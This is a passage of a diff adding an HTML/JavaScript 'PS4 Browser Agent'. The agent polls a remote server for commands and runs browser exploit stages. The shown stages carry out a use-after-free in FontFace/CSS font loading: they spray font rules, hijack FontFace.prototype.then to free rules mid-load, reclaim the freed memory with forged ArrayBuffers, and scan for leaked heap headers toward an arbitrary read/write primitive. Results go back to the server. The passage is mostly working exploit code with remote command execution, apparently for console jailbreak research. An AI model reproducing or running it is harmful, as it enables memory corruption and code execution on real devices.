+                                        new Promise(function(r){ setTimeout(function(){ r('__HUNG__'); }, 6000); })
+                                    ]);
+                                } catch(e) { outcome = 'REJECTED'; }
+                                Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then });
+                                if (fonts === '__HUNG__') {
+                                    outcome = 'HUNG';
+                                } else if (outcome !== 'REJECTED') {
+                                    outcome = 'COMPLETED len=' + fonts.length;
+                                }
+                                push('[' + cand.name + '] load outcome: ' + outcome);
+                                if (outcome.indexOf('COMPLETED') === 0) {
+                                    var hits = [];
+                                    for (var zi = 0; zi < abs.length; zi++) {
+                                        try {
+                                            var dv = new DataView(abs[zi]);
+                                            var v8 = dv.getBigUint64(8, true);
+                                            if (v8 === 2n || v8 === 3n) {
+                                                var hdr = [];
+                                                for (var b = 0; b < 0x50; b += 8) hdr.push(dv.getBigUint64(b, true).toString(16));
+                                                hits.push('idx=' + zi + ' v8=' + v8.toString() + ' ' + hdr.join(' '));
+                                            }
+                                        } catch(e) {}
+                                    }
+                                    push('[' + cand.name + '] refcount-bumped buffers: ' + hits.length);
+                                    for (var hi = 0; hi < hits.length; hi++) push('  LEAK ' + hits[hi]);
+                                }
+                                roneResolve(outcome.indexOf('COMPLETED') === 0 ? 'COMPLETED' : outcome);
+                            } catch(e) {
+                                push('[' + cand.name + '] threw: ' + e);
+                                roneResolve('THREW');
+                            }
+                        })();
+                    });
+                }
+
+                (async function() {
+                    var candidates = [
+                        { name: 'A size0xb8', size: 0xb8, status: null },
+                        { name: 'B size0xc0', size: 0xc0, status: null },
+                        { name: 'C size0xc8', size: 0xc8, status: null },
+                        { name: 'D size0xd0', size: 0xd0, status: null },
+                        { name: 'E size0xb8 st82', size: 0xb8, status: 0x82 },
+                        { name: 'F size0xc0 st8a', size: 0xc0, status: 0x8a },
+                        { name: 'G size0xc8 st92', size: 0xc8, status: 0x92 }
+                    ];
+                    for (var ci = 0; ci < candidates.length; ci++) {
+                        var r = await runOne(candidates[ci]);
+                        if (r === 'COMPLETED') { push('SUCCESS with ' + candidates[ci].name); break; }
+                        cleanup();
+                    }
+                    finish();
+                })();
+            });
+        })();
+    },
+
+    // STAGE 1E: reference-exact UAF reclaim + status-offset scan.
+    // Mirrors CSSFontFace-Exploit's init_arw exactly: refcount=1 @ offset 8,
+    // m_status=Status::Success(3) at a scan offset, offset 0 left alone.
+    // Candidates: array of [sizeHex, statusOffHex]. A Web Worker watchdog
+    // keeps ticking to distinguish 'renderer crash' from 'main-thread block'.
+    'stage1_v4': function(candidates) {
+        return (function() {
+            return new Promise(function(resolve) {
+                var out = [];
+                function push(m) { out.push(m); sendLog('W4: ' + m); }
+                var done = false;
+                function finish() { if (!done) { done = true; clearTimeout(overall); resolve(out.join('\n')); } }
+                var overall = setTimeout(finish, 60000);
+
+                var wcode = 'setInterval(function(){ var x=new XMLHttpRequest(); x.open("GET","' + SERVER + '/log?m=W4WD:alive",false); x.send(); }, 2000);';
+                var w = null;
+                try {
+                    var blob = new Blob([wcode], {type: 'application/javascript'});
+                    w = new Worker(URL.createObjectURL(blob));
+                } catch(e) { push('watchdog worker failed: ' + e); }
+
+                function cleanup() {
+                    try {
+                        var st = document.querySelectorAll('style');
+                        for (var i = 0; i < st.length; i++) st[i].remove();
+                    } catch(e) {}
+                    try {
+                        var all = document.fonts;
+                        for (var i = all.size - 1; i >= 0; i--) { try { all.delete(all[i]); } catch(e) {} }
+                    } catch(e) {}
+                }
+
+                function runOne(cand, ci) {
+                    return new Promise(function(roneResolve) {
+                        (async function() {
+                            var size = parseInt(cand[0], 16);
+                            var statusOff = parseInt(cand[1], 16);
+                            try {
+                                var spray_count = 0x80;
+                                var spray_font_rule = '@font-face{font-family:spray;src:local(Helvetica Bold);unicode-range:U+0043;}';
+                                var uaf_font_rule = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                                var abs = [];
+                                var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                                document.fonts.add(A);
+                                void A.loaded;
+                                var style = document.createElement('style');
+                                document.head.appendChild(style);
+                                var idx;
+                                for (idx = 0; idx < spray_count / 4; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                                var uaf_idx = style.sheet.cssRules.length;
+                                style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                                for (idx = spray_count / 4; idx < spray_count; idx++) style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+                                try { document.body.offsetTop; } catch(e) {}
+
+                                var old_then = FontFace.prototype.then;
+                                Object.defineProperty(FontFace.prototype, 'then', {
+                                    configurable: true,
+                                    get: function() {
+                                        if (this === A) {
+                                            try { style.sheet.deleteRule(0); } catch(e) {}
+                                            try { document.body.offsetTop; } catch(e) {}
+                                            for (idx = spray_count - 1; idx > 0; idx--) {
+                                                if (idx !== uaf_idx) { try { style.sheet.deleteRule(idx); } catch(e) {} }
+                                            }
+                                            try { document.body.offsetTop; } catch(e) {}
+                                            push('[' + ci + '] size=' + size.toString(16) + ' st@' + statusOff.toString(16) + ' spraying ' + 0x40 + ' bufs');
+                                            for (var n = 0; n < 0x40; n++) {
+                                                var ab = new ArrayBuffer(size);
+                                                var dv = new DataView(ab);
+                                                if (statusOff === -1) {
+                                                    var u8 = new Uint8Array(ab);
+                                                    for (var b = 0; b < size; b++) u8[b] = 3;
+                                                }
+                                                dv.setBigUint64(8, 1n, true);
+                                                if (statusOff >= 0) { try { dv.setUint8(statusOff, 3); } catch(e) {} }
+                                                abs.push(ab);
+                                            }
+                                        }
+                                        return undefined;
+                                    }
+                                });
+
+                                var fonts;
+                                var outcome = 'HUNG';
+                                try {
+                                    fonts = await Promise.race([
+                                        document.fonts.load('1em a, b', 'AB'),
+                                        new Promise(function(r) { setTimeout(function(){ r('__HUNG__'); }, 8000); })
+                                    ]);
+                                } catch(e) { outcome = 'REJECTED'; }
+                                Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then });
+
+                                if (fonts === '__HUNG__') {
+                                    outcome = 'HUNG';
+                                } else if (outcome !== 'REJECTED') {
+                                    outcome = 'COMPLETED len=' + (fonts ? fonts.length : '?');
+                                }
+                                push('[' + ci + '] outcome: ' + outcome);
+                                if (fonts && fonts !== '__HUNG__') {
+                                    for (idx = 0; idx < fonts.length; idx++) {
+                                        push('  f[' + idx + '] status=' + fonts[idx].status + ' ur=' + fonts[idx].unicodeRange);
+                                    }
+                                }
+                                var hits = [];
+                                for (var zi = 0; zi < abs.length; zi++) {
+                                    try {
+                                        var dv = new DataView(abs[zi]);
+                                        var v0 = dv.getBigUint64(0, true);
+                                        var v8 = dv.getBigUint64(8, true);
+                                        if ((v0 >= 1n && v0 <= 4n) || (v8 >= 1n && v8 <= 4n)) {
+                                            var hdr = [];
+                                            for (var b = 0; b < 0x60 && b + 8 <= size; b += 8) hdr.push(dv.getBigUint64(b, true).toString(16));
+                                            hits.push('idx=' + zi + ' sz=' + size.toString(16) + ' v0=' + v0.toString() + ' v8=' + v8.toString() + ' hdr=' + hdr.join(' '));
+                                        }
+                                    } catch(e) {}
+                                }
+                                push('[' + ci + '] reclaimed-ish buffers: ' + hits.length);
+                                for (var hi = 0; hi < hits.length; hi++) push('  R ' + hits[hi]);
+                                roneResolve(outcome);
+                            } catch(e) {
+                                push('[' + ci + '] threw: ' + e);
+                                roneResolve('THREW');
+                            }
+                        })();
+                    });
+                }
+
+                (async function() {
+                    var list = candidates || [["0xc0","-1"],["0xc0","0x82"],["0xc0","0x7a"],["0xc0","0x8a"]];
+                    for (var ci = 0; ci < list.length; ci++) {
+                        var r = await runOne(list[ci], ci);
+                        if (r.indexOf('COMPLETED') === 0) { push('>>> SUCCESS candidate ' + ci); break; }
+                        cleanup();
+                    }
+                    try { if (w) w.terminate(); } catch(e) {}
+                    finish();
+                })();
+            });
+        })();
+    }
+};
+
+// ============================================
+// MAIN LOOP - Poll for commands and execute
+// ============================================
+log('PS4 Browser Agent started');
+log('Polling ' + SERVER + ' for commands...');
+
+function mainLoop() {
+    try {
+        var cmd = poll();
+        if (cmd && cmd.action) {
+            log('CMD: ' + cmd.action + (cmd.args ? ' ' + JSON.stringify(cmd.args) : ''));
+            
+            if (commands[cmd.action]) {
+                try {
+                    var result = commands[cmd.action].apply(null, cmd.args || []);
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(val) {
+                            sendResult(cmd.action, val);
+                            log('RESULT: ' + String(val).substring(0, 200));
+                        }).catch(function(e) {
+                            sendResult(cmd.action, 'PROMISE REJECT: ' + (e && e.message || e));
+                            log('PROMISE REJECT: ' + e);
+                        });
+                    } else {
+                        sendResult(cmd.action, result);
+                        log('RESULT: ' + String(result).substring(0, 200));
+                    }
+                } catch(e) {
+                    sendResult(cmd.action, 'THROW: ' + (e && e.message || e));
+                    log('COMMAND THROW: ' + e);
+                }
+            } else {
+                sendResult(cmd.action, 'UNKNOWN COMMAND: ' + cmd.action);
+            }
+        }
+    } catch(e) {
+        log('LOOP ERROR: ' + e);
+    }
+    
+    // Update status
+    statusEl.textContent = 'Active | ' + new Date().toLocaleTimeString();
+    
+    // Poll every 500ms
+    setTimeout(mainLoop, 500);
+}
+
+// Start
+mainLoop();
+</script>
+</body></html>
